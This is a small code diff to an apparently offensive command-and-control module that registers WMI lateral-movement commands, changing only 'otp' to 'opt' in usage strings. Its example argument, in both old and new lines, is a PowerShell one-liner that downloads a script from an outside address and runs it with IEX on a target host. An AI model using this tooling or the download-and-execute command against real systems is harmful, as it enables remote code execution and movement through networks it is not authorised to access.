@@ -113,5 +113,5 @@ def wmi_proccreate( demonID, *params ):
     return TaskID
 
 RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
-RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <otp:username> <otp:password> <otp:domain>", "10.10.10.10 /tmp/demon.vba" )
-RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <otp:username> <otp:password> <otp:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
+RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <opt:username> <opt:password> <opt:domain>", "10.10.10.10 /tmp/demon.vba" )
+RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <opt:username> <opt:password> <opt:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
